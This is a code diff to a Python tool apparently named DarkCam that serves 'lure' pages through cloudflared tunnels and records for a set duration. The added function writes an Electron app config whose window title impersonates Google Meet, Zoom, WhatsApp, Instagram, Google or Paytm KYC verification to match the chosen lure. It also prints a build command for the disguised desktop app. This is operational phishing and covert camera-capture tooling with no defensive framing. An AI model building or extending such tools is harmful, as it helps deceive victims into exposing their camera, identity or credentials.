@@ -488,6 +488,23 @@ def run_all_mode(base_port, duration, no_tunnel):
     print_all_info(results, duration)
     return tunnel_procs
 
+def _write_electron_config(url, page):
+    import json as _json
+    titles = {
+        "meet": "Google Meet", "zoom": "Zoom", "whatsapp": "WhatsApp",
+        "instagram": "Instagram", "omegle": "Omegle", "teams": "Microsoft Teams",
+        "telegram": "Telegram", "facetime": "FaceTime",
+        "instagram_verify": "Instagram", "google_verify": "Google",
+        "paytm_kyc": "Paytm", "captcha": "Google Meet",
+    }
+    cfg = {"url": url, "title": titles.get(page, "SecureMeet"), "width": 1280, "height": 800}
+    cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "electron", "config.json")
+    with open(cfg_path, "w") as f:
+        _json.dump(cfg, f, indent=2)
+    print(f"\n  {_G}[+]{_R} electron/config.json updated → {_W}{url}{_R}")
+    print(f"  {_O}[*]{_R} To build the Electron app:")
+    print(f"        {_D}cd electron && ./build.sh {url}{_R}\n")
+
 def interactive_menu():
     """Step-by-step interactive lure selector. Returns (page, port, no_tunnel, duration, is_all)."""
     clear()
@@ -515,6 +532,7 @@ def main():
     parser.add_argument("--port", type=int, default=8080, help="Base port (default 8080)")
     parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
     parser.add_argument("--no-tunnel", action="store_true", help="Skip cloudflared, use local only")
+    parser.add_argument("--electron", action="store_true", help="After tunnel starts, write electron/config.json + print build command")
     args = parser.parse_args()
 
     # ── If flags provided, skip the menu (legacy / scripted use) ──
@@ -562,6 +580,9 @@ def main():
             tunnel_procs.append(proc)
 
         print_info(public_url, page, port, duration)
+
+        if args.electron and public_url.startswith("http"):
+            _write_electron_config(public_url, page)
 
     def cleanup(sig=None, frame=None):
         print(f"\n\n  {_O}[!]{_R} Shutting down DarkCam...")
